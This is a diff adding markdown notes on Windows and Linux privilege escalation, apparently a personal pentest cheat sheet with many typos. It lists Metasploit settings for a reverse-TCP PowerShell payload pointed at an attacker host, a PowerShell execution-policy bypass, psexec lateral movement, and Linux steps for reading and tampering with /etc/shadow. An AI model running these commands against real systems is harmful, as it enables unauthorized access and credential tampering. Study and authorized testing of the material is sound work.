@@ -210,13 +210,51 @@ export SHELL=bash
 ```
 
 
+## Widows Privilege Escalation 
++ In order to elevaste your privileges on Windowso you have to difentify the privilege escaltion The process will diffret greatly based on the types of target you gain access to
++ PrivescCheck for Windows 
 
+```
+msfconsole > web_delivery
+set target PSH
+set target PSH\ (Binary)
+set payload windows/shell/reverse_tcp
+set PSH-EcondedCommand False
+set LHOST KALIIP
 
+shell_to_meterpreter
+set LHOST eth1
+show advanced
+set WIN_TRANSFER VBS
 
+Privescheck.ps1
+powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,CSV,HTML,XML"
 
+```
 
+## Widnows Privlege Escelation 
++ psexec.py username@IP
++  msconsole psexec 
 
+## Linux Privlege Escalation Weak Permissions 
++ Linenum
++ 
+```
+cat /etc/passwd
+cat /etc/groups
+groups
+find / -not -type l -perm -o+w
+ls -al /etc/shadow
+openssl passwd -1 -salt abc password
+remove * from etc shadow
 
+```
+
+## Linux Privlege Esclation Sudo 
++ Sudo Prileges access to target system
+cat /etc/passwd
+sudo -l
+https://gtfobins.github.io/ 
 
 
 
